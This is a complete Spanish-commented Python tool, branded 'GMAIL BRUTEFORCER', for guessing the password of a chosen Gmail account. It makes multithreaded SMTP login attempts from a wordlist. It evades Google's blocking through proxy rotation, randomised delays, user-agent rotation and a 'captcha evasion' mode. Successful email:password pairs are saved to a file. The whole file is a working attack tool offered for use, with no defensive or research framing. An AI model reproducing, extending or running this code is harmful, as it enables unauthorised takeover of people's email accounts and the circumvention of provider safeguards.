import smtplib
import os
import sys
import time
import random
import logging
import argparse
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import socket
import socks
import queue
import threading

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bruteforce.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("gmail_bruteforcer")

# Intentar importar dependencias
DEPENDENCIES = ["colorama", "tqdm", "pysocks", "requests"]

def check_dependencies():
    """Verifica e instala dependencias necesarias."""
    for package in DEPENDENCIES:
        try:
            __import__(package)
        except ImportError:
            print(f"Instalando {package}...")
            os.system(f"{sys.executable} -m pip install {package}")

# Instalar dependencias
check_dependencies()

# Ahora importamos colorama después de verificar su instalación
from colorama import init, Fore, Style
import requests

# Inicializar colorama
init(autoreset=True)

# Colores
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
B = Fore.BLUE
W = Fore.WHITE
RESET = Style.RESET_ALL

# Clase para gestionar pool de conexiones SMTP
class SMTPConnectionPool:
    def __init__(self, host="smtp.gmail.com", port=465, pool_size=5, timeout=10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.pool_size = pool_size
        self.connections = queue.Queue(maxsize=pool_size)
        self.lock = threading.Lock()
        self.active_connections = 0
        self.initialize_pool()
    
    def initialize_pool(self):
        """Inicializa el pool con conexiones SMTP."""
        for _ in range(self.pool_size):
            self._create_connection()
    
    def _create_connection(self):
        """Crea una nueva conexión SMTP y la añade al pool."""
        try:
            server = smtplib.SMTP_SSL(self.host, self.port, timeout=self.timeout)
            server.ehlo()
            self.connections.put(server)
            with self.lock:
                self.active_connections += 1
            return True
        except Exception as e:
            logger.error(f"Error creando conexión SMTP: {e}")
            return False
    
    def get_connection(self):
        """Obtiene una conexión del pool."""
        try:
            # Esperar máximo 5 segundos por una conexión
            connection = self.connections.get(timeout=5)
            return connection
        except queue.Empty:
            # Si no hay conexiones disponibles, crear una nueva
            logger.info("Pool agotado, creando nueva conexión")
            try:
                server = smtplib.SMTP_SSL(self.host, self.port, timeout=self.timeout)
                server.ehlo()
                return server
            except Exception as e:
                logger.error(f"Error creando conexión adicional: {e}")
                return None
    
    def return_connection(self, connection):
        """Devuelve una conexión al pool."""
        try:
            # Verificar que la conexión sigue activa
            connection.noop()
            self.connections.put(connection)
        except:
            # Si la conexión ha fallado, crear una nueva
            with self.lock:
                self.active_connections -= 1
            self._create_connection()
    
    def close_all(self):
        """Cierra todas las conexiones en el pool."""
        while not self.connections.empty():
            try:
                connection = self.connections.get_nowait()
                connection.quit()
            except:
                pass

# Clase para manejar proxies
class ProxyManager:
    def __init__(self, proxy_file=None):
        self.proxies = []
        self.current_index = 0
        self.lock = threading.Lock()
        
        if proxy_file:
            self.load_proxies(proxy_file)
    
    def load_proxies(self, proxy_file):
        """Carga proxies desde un archivo."""
        try:
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            logger.info(f"Cargados {len(self.proxies)} proxies")
        except Exception as e:
            logger.error(f"Error cargando proxies: {e}")
    
    def get_next_proxy(self):
        """Obtiene el siguiente proxy en la lista."""
        if not self.proxies:
            return None
        
        with self.lock:
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
        
        return proxy
    
    def apply_proxy(self, proxy_str):
        """Aplica la configuración de proxy al sistema."""
        if not proxy_str:
            return False
        
        try:
            # Formato esperado: tipo:ip:puerto o ip:puerto
            parts = proxy_str.split(':')
            if len(parts) == 3:
                proxy_type, ip, port = parts
                proxy_type = proxy_type.lower()
            elif len(parts) == 2:
                ip, port = parts
                proxy_type = 'socks5'  # Tipo por defecto
            else:
                logger.error(f"Formato de proxy inválido: {proxy_str}")
                return False
            
            # Convertir tipo de proxy a constante de socks
            proxy_types = {
                'socks4': socks.SOCKS4,
                'socks5': socks.SOCKS5,
                'http': socks.HTTP
            }
            
            if proxy_type not in proxy_types:
                logger.error(f"Tipo de proxy no soportado: {proxy_type}")
                return False
            
            # Aplicar configuración de proxy
            socks.set_default_proxy(proxy_types[proxy_type], ip, int(port))
            socket.socket = socks.socksocket
            logger.info(f"Proxy aplicado: {proxy_str}")
            return True
        except Exception as e:
            logger.error(f"Error aplicando proxy {proxy_str}: {e}")
            return False

def clear_screen():
    """Limpia la pantalla según el sistema operativo."""
    os.system("cls" if os.name == "nt" else "clear")

def display_banner():
    """Muestra el banner del programa."""
    clear_screen()
    print(f"{G}{'=' * 50}")
    print(f"{C}               GMAIL BRUTEFORCER")
    print(f"{Y}                   Why so ez")
    print(f"{G}{'=' * 50}")
    print(f"""{B}               .--.
              |o_o |
              |:_/ |
             //   \\ \\
            (|     | )
           /'\\_   _/`\\
           \\___)=(___/""")
    print(f"{G}{'=' * 50}")
    print(f"{Y}        Powered by lsdbroh / bloodyzeze{RESET}")
    print(f"{G}{'=' * 50}")
    print()

def display_menu():
    """Muestra el menú principal y retorna la opción seleccionada."""
    print(f"{C}[1]{RESET} Iniciar Ataque")
    print(f"{C}[2]{RESET} Configurar Opciones Avanzadas")
    print(f"{C}[3]{RESET} Salir")
    
    while True:
        try:
            option = int(input(f"{Y}==> {RESET}"))
            if option in [1, 2, 3]:
                return option
            print(f"{R}[!] Opción inválida. Intenta de nuevo.{RESET}")
        except ValueError:
            print(f"{R}[!] Por favor ingresa un número válido.{RESET}")

def display_advanced_options(config):
    """Muestra y permite modificar opciones avanzadas."""
    clear_screen()
    print(f"{G}{'=' * 50}")
    print(f"{C}          CONFIGURACIÓN AVANZADA")
    print(f"{G}{'=' * 50}")
    
    print(f"{C}[1]{RESET} Número de hilos: {config['threads']}")
    print(f"{C}[2]{RESET} Tiempo entre intentos: {config['delay_min']}-{config['delay_max']}s")
    print(f"{C}[3]{RESET} Tamaño del pool de conexiones: {config['pool_size']}")
    print(f"{C}[4]{RESET} Archivo de proxies: {config['proxy_file'] or 'No configurado'}")
    print(f"{C}[5]{RESET} Intentos por proxy: {config['attempts_per_proxy']}")
    print(f"{C}[6]{RESET} Modo evasión captcha: {'Activado' if config['captcha_evasion'] else 'Desactivado'}")
    print(f"{C}[7]{RESET} Volver al menú principal")
    
    while True:
        try:
            option = int(input(f"{Y}==> {RESET}"))
            if option == 1:
                config['threads'] = int(input(f"{B}Nuevo número de hilos: {RESET}"))
            elif option == 2:
                config['delay_min'] = float(input(f"{B}Tiempo mínimo entre intentos (segundos): {RESET}"))
                config['delay_max'] = float(input(f"{B}Tiempo máximo entre intentos (segundos): {RESET}"))
            elif option == 3:
                config['pool_size'] = int(input(f"{B}Nuevo tamaño del pool: {RESET}"))
            elif option == 4:
                config['proxy_file'] = input(f"{B}Ruta al archivo de proxies (dejar vacío para deshabilitar): {RESET}")
                if not config['proxy_file']:
                    config['proxy_file'] = None
            elif option == 5:
                config['attempts_per_proxy'] = int(input(f"{B}Intentos por proxy: {RESET}"))
            elif option == 6:
                toggle = input(f"{B}¿Activar modo evasión captcha? (s/n): {RESET}").lower()
                config['captcha_evasion'] = toggle == 's'
            elif option == 7:
                return
            else:
                print(f"{R}[!] Opción inválida. Intenta de nuevo.{RESET}")
        except ValueError:
            print(f"{R}[!] Por favor ingresa un valor válido.{RESET}")

def load_passwords(file_path):
    """Carga las contraseñas desde un archivo."""
    path = Path(file_path)
    if not path.is_file():
        logger.error(f"Archivo no encontrado: {file_path}")
        return []
    
    try:
        with path.open("r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        logger.info(f"Cargadas {len(passwords)} contraseñas.")
        return passwords
    except Exception as e:
        logger.error(f"Error al cargar archivo de contraseñas: {e}")
        return []

def try_login(email, password, connection_pool, attempt_count=0, max_attempts=3):
    """Intenta iniciar sesión con un email y contraseña dados."""
    if attempt_count >= max_attempts:
        logger.error(f"Máximo de intentos alcanzado para {password}")
        return False
    
    connection = connection_pool.get_connection()
    if not connection:
        time.sleep(random.uniform(2, 5))  # Esperar antes de reintentar
        return try_login(email, password, connection_pool, attempt_count + 1, max_attempts)
    
    try:
        connection.login(email, password)
        logger.info(f"¡ÉXITO! Contraseña encontrada: {password}")
        # Guardar credenciales en archivo
        with open("credentials_found.txt", "a") as f:
            f.write(f"{email}:{password}\n")
        return True
    except smtplib.SMTPAuthenticationError as e:
        error = str(e)
        if "Application-specific password" in error or "<" in error:
            logger.info(f"¡ÉXITO! Sesión iniciada con: {password}")
            # Guardar credenciales en archivo
            with open("credentials_found.txt", "a") as f:
                f.write(f"{email}:{password}\n")
            connection_pool.return_connection(connection)
            return True
        connection_pool.return_connection(connection)
        return False
    except Exception as e:
        logger.error(f"Error durante el intento de login: {e}")
        # No devolvemos la conexión al pool si hubo un error grave
        try:
            connection.quit()
        except:
            pass
        
        # Reintentar con una nueva conexión
        if attempt_count < max_attempts:
            time.sleep(random.uniform(2, 5))
            return try_login(email, password, connection_pool, attempt_count + 1, max_attempts)
        return False

def check_email_validity(email):
    """Verifica si un email es válido."""
    try:
        # Verificación básica de formato
        if '@' not in email or '.' not in email:
            return False
        
        # Verificar si el dominio es Gmail
        domain = email.split('@')[1].lower()
        if domain != 'gmail.com':
            logger.warning(f"El dominio {domain} no es gmail.com. Esto podría no funcionar.")
        
        return True
    except Exception:
        return False

def rotate_user_agents():
    """Devuelve un User-Agent aleatorio de una lista predefinida."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(user_agents)

def check_if_blocked(proxy_manager=None):
    """Verifica si estamos bloqueados por Google."""
    try:
        headers = {'User-Agent': rotate_user_agents()}
        proxies = None
        
        if proxy_manager:
            proxy = proxy_manager.get_next_proxy()
            if proxy:
                parts = proxy.split(':')
                if len(parts) >= 2:
                    proxy_str = f"{parts[-2]}:{parts[-1]}"
                    proxies = {
                        'http': f"socks5://{proxy_str}",
                        'https': f"socks5://{proxy_str}"
                    }
        
        response = requests.get("https://accounts.google.com", headers=headers, proxies=proxies, timeout=10)
        if "unusual traffic" in response.text.lower() or "captcha" in response.text.lower():
            return True
        return False
    except Exception as e:
        logger.error(f"Error verificando bloqueo: {e}")
        return False

def gmail_bruteforce(email=None, password_file=None, config=None):
    """Función principal de fuerza bruta."""
    if config is None:
        config = {
            'threads': 1,
            'delay_min': 1.0,
            'delay_max': 3.0,
            'pool_size': 5,
            'proxy_file': None,
            'attempts_per_proxy': 10,
            'captcha_evasion': True
        }
    
    # Solicitar datos si no se proporcionaron como argumentos
    if email is None:
        email = input(f"{B}Email objetivo: {RESET}").strip()
        
        # Validar email
        if not check_email_validity(email):
            print(f"{R}[!] El email proporcionado no parece válido. ¿Deseas continuar? (s/n): {RESET}")
            if input().lower() != 's':
                return
    
    if password_file is None:
        password_file = input(f"{B}Ruta al archivo de contraseñas: {RESET}").strip()
    
    # Cargar contraseñas
    passwords = load_passwords(password_file)
    if not passwords:
        print(f"{R}[!] No se pudieron cargar contraseñas. Abortando.{RESET}")
        return
    
    # Inicializar manager de proxies si se especificó un archivo
    proxy_manager = None
    if config['proxy_file']:
        proxy_manager = ProxyManager(config['proxy_file'])
        if not proxy_manager.proxies:
            print(f"{Y}[!] No se cargaron proxies. Continuando sin ellos.{RESET}")
            proxy_manager = None
    
    print(f"{G}[+] Iniciando ataque contra {email} con {len(passwords)} contraseñas.{RESET}")
    print(f"{G}[+] Configuración: {config['threads']} hilos, pool de {config['pool_size']} conexiones.{RESET}")
    if proxy_manager:
        print(f"{G}[+] Usando {len(proxy_manager.proxies)} proxies con {config['attempts_per_proxy']} intentos por proxy.{RESET}")
    print()
    
    # Inicializar pool de conexiones
    connection_pool = SMTPConnectionPool(pool_size=config['pool_size'])
    
    # Variable para controlar si se encontró la contraseña
    password_found = threading.Event()
    
    # Función para intentar login con esperas aleatorias
    def delayed_login_worker(password, worker_id):
        if password_found.is_set():
            return True
        
        # Si estamos usando proxies, rotar después de cierto número de intentos
        if proxy_manager and worker_id % config['attempts_per_proxy'] == 0:
            proxy = proxy_manager.get_next_proxy()
            if proxy:
                logger.info(f"Worker {worker_id} rotando a proxy: {proxy}")
                proxy_manager.apply_proxy(proxy)
        
        # Verificar si estamos bloqueados (no en cada intento para no ralentizar)
        if config['captcha_evasion'] and worker_id % 5 == 0:
            if check_if_blocked(proxy_manager):
                logger.warning(f"Detección de bloqueo. Esperando antes de continuar...")
                time.sleep(random.uniform(60, 120))  # Esperar más tiempo si detectamos bloqueo
                
                # Si estamos usando proxies, cambiar inmediatamente
                if proxy_manager:
                    proxy = proxy_manager.get_next_proxy()
                    if proxy:
                        logger.info(f"Cambiando proxy debido a bloqueo: {proxy}")
                        proxy_manager.apply_proxy(proxy)
        
        # Tiempo de espera aleatorio para evitar patrones
        time.sleep(random.uniform(config['delay_min'], config['delay_max']))
        
        # Intentar login
        success = try_login(email, password, connection_pool)
        if success:
            password_found.set()
            print(f"\n{G}[✔] Ataque exitoso. Contraseña encontrada: {password}{RESET}")
        return success
    
    try:
        # Usar ThreadPoolExecutor para paralelismo
        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
            with tqdm(total=len(passwords), desc="Progreso", unit="pwd") as progress:
                # Asignar un ID único a cada trabajo
                futures = {executor.submit(delayed_login_worker, password, i): i 
                          for i, password in enumerate(passwords)}
                
                for future in futures:
                    try:
                        success = future.result()
                        progress.update(1)
                        if success and password_found.is_set():
                            break
                    except Exception as e:
                        logger.error(f"Error en worker: {e}")
                        progress.update(1)
                    
                    # Si encontramos la contraseña, cancelar los demás trabajos
                    if password_found.is_set():
                        for f in futures:
                            if not f.done():
                                f.cancel()
                        break
    finally:
        # Cerrar todas las conexiones
        connection_pool.close_all()
    
    if not password_found.is_set():
        print(f"\n{R}[X] Ataque finalizado. No se encontró ninguna contraseña.{RESET}")

def parse_arguments():
    """Parsea los argumentos de línea de comandos."""
    parser = argparse.ArgumentParser(description="Gmail Bruteforcer Mejorado")
    parser.add_argument("-e", "--email", help="Email objetivo")
    parser.add_argument("-p", "--password-file", help="Archivo de contraseñas")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Número de hilos (default: 1)")
    parser.add_argument("--proxy-file", help="Archivo con lista de proxies")
    parser.add_argument("--pool-size", type=int, default=5, help="Tamaño del pool de conexiones")
    parser.add_argument("--no-banner", action="store_true", help="No mostrar banner")
    parser.add_argument("--delay-min", type=float, default=1.0, help="Tiempo mínimo entre intentos (segundos)")
    parser.add_argument("--delay-max", type=float, default=3.0, help="Tiempo máximo entre intentos (segundos)")
    
    return parser.parse_args()

def main():
    """Punto de entrada principal del programa."""
    args = parse_arguments()
    
    if not args.no_banner:
        display_banner()
    
    # Configuración por defecto
    config = {
        'threads': args.threads,
        'delay_min': args.delay_min,
        'delay_max': args.delay_max,
        'pool_size': args.pool_size,
        'proxy_file': args.proxy_file,
        'attempts_per_proxy': 10,
        'captcha_evasion': True
    }
    
    if args.email and args.password_file:
        # Modo directo desde argumentos
        gmail_bruteforce(args.email, args.password_file, config)
    else:
        # Modo interactivo
        while True:
            option = display_menu()
            if option == 1:
                gmail_bruteforce(config=config)
            elif option == 2:
                display_advanced_options(config)
            elif option == 3:
                print(f"{C}¡Hasta pronto!{RESET}")
                sys.exit(0)
            
            # Preguntar si desea continuar
            response = input(f"\n{Y}¿Quieres continuar? (s/n): {RESET}").lower()
            if response != 's':
                print(f"{C}¡Hasta pronto!{RESET}")
                break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Operación cancelada por el usuario.{RESET}")
    except Exception as e:
        logger.critical(f"Error fatal: {e}")
        print(f"{R}[!] Error inesperado: {e}{RESET}")